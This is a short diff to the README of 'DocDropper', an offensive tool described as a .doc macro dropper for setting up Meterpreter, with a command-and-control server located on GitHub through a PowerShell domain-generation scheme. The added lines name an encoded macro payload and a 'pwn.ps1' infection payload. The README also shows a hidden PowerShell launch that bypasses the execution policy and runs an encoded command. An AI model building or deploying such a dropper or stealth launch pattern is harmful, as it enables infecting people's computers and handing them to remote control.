@@ -8,7 +8,10 @@ DocDropper (POC+) is a .doc file dropper. You can start from it to setup Meterpr
 
 Indeed, DocDropper use a PowerShell Dynamic Generation Algorithm (DGA) to find a C&C hosted on Github.com.
 
-Begin by `./dropper/vector.payload.ps1` : this is the encoded payload in the active Macro.
+Begin by `./dropper/vector.payload.ps1` is the encoded payload in the active Macro.
+
+Next, `./stub/pwn.ps1` is the main payload to execute during infection
+
 
 ```
 powershell.exe -ExecutionPolicy Bypass -WindowStyle hidden -encodedCommand [code]
